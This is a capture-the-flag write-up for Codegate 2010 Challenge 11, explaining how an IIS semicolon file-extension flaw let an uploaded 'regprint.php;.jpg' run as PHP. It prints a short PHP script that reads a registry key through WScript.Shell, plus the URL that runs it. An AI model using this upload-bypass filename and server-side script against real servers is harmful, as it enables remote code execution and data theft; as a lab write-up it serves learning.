---
title: Codegate 2010 Challenge 11 writeup
author: hieu le
layout: post

aktt_notify_twitter:
  - no
tweetbackscheck:
  - 1408358982
shorturls:
  - 'a:4:{s:9:"permalink";s:69:"http://www.vnsecurity.net/2010/03/codegate-2010-challenge-11-writeup/";s:7:"tinyurl";s:26:"http://tinyurl.com/y95rqv8";s:4:"isgd";s:18:"http://is.gd/aOuhl";s:5:"bitly";s:20:"http://bit.ly/aCd8li";}'
twittercomments:
  - 'a:2:{i:10694573292;s:7:"retweet";i:10669504654;s:7:"retweet";}'
tweetcount:
  - 2
category:
  - 'CTF - CLGT Crew'
tags:
  - '2010'
  - CLGT
  - codegate
  - Cryptography
  - CTF
  - IIS
  - PHP
  - semi-colon vulnerability
---
<h2 id="Summary" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  Summary<a title="Link to this section" href="#Summary"></a>
</h2>

[<span> </span>http://ctf6.codegate.org/31337_/index.html][1]

Get a value of HKLMSoftwarecodegate2010, it&#8217;s the flag.

<h2 id="Analysis" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  Analysis<a title="Link to this section" href="#Analysis"></a>
</h2>

At first when accessing the url, it shows up a page allow you to upload a jpeg image and only .jpg files. As I noticed, it serves by IIS. Suddenly, I remember of the vulnerability of IIS in processing image files. A little bit google show me the result. Ah ha, let&#8217;s test it by uploading a php file likes &#8220;test.php;.jpg&#8221;. Incredible!

<p style="text-indent: 0.5em">
  Now, the only thing we have to do is writing some lines of php to read the REG key.
</p>

<pre style="background-color: #f7f7f7;margin-top: 1em;margin-right: 1.75em;margin-bottom: 1em;margin-left: 1.75em;padding: 0.25em;border: 1px solid #d7d7d7">regprint.php;.jpg
&lt;?
$shell = new COM("WScript.Shell") or die("Requires Windows Scripting Host");
$devenvpath=$shell-&gt;RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\codegate2010");
echo $devenvpath
?&gt;</pre>

Then, execute it by [<span> </span>http://ctf6.codegate.org/31337_/upload/regprint.php;.jpg][2]

<p style="text-indent: 0.5em">
  <tt>LollerSkaterz_From_RoflCopters_With_Guinness</tt>
</p>

<p style="text-indent: 0.5em">
  Easy game with 1200 point.
</p>

<h2 id="Vulnerability" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  Vulnerability<a title="Link to this section" href="#Vulnerability"></a>
</h2>

In facts, after the game thaidn said that it&#8217;s a fault of deploying the challenge, it&#8217;s designed to be passed by a 0-day of core php.

<h2 id="References" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  References<a title="Link to this section" href="#References"></a>
</h2>

*   [<span> </span>http://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/][3]
*   Keywords: IIS, semi-colon vulnerability

 [1]: http://ctf6.codegate.org/31337_/index.html
 [2]: http://ctf6.codegate.org/31337_/upload/regprint.php;.jpg
 [3]: http://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/